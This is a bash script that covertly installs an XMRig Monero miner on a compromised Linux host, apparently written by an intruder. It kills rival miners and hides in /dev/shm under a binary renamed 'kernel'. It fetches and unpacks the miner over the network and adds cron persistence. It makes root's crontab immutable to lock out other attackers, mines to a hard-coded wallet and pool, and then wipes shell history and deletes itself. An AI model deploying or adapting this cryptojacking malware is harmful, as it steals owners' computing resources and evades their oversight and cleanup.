#!/bin/bash

# Configuration - Hlaing Bwar's Settings
W="45cV4VxfBgeTzXeU4YoWQUQtjkugAuwqXVXpJmiMExRsYutqBa5RAEg6ZtPWpY7vVQ3tULGBszh1h1CLsAz1sqoXExNykBL"
P="gulf.moneroocean.stream:10128"
N="HlaingBwar_Worker"

# 1. Competitor Cleanup - Kill anyone else
# This kills java miners, node miners, and common xmrig instances
pkill -9 -f "javae|node-f|xmrig|miner|nanominer|nicehash"
rm -rf /tmp/.XIN-unix /tmp/.javae /tmp/node-f 2>/dev/null

# 2. Setup Working Directory
# Using a hidden system path for stealth
D="/dev/shm/.sys_cache"
mkdir -p $D && cd $D

# 3. Download Miner (XMRig) if not exist
if [ ! -f "kernel" ]; then
    curl -s -L https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz | tar xz --strip-components=1
    mv xmrig kernel
fi

# 4. Persistence - Stay alive even after reboot
# Setup a hidden cronjob to check every 5 minutes
(crontab -l 2>/dev/null | grep -v "kernel"; echo "*/5 * * * * $D/kernel --url $P --user $W --pass $N --donate-level 1 -B") | crontab -

# 5. Lock the gate - Prevent others from editing crontab
# Making it harder for the next hacker to kick you out
chattr +i /var/spool/cron/crontabs/root 2>/dev/null

# 6. Execution - Run in background
nohup ./kernel --url $P --user $W --pass $N --donate-level 1 -B > /dev/null 2>&1 &

# 7. Self-Destruct Script - Hide our tracks
history -c && rm -- "$0"
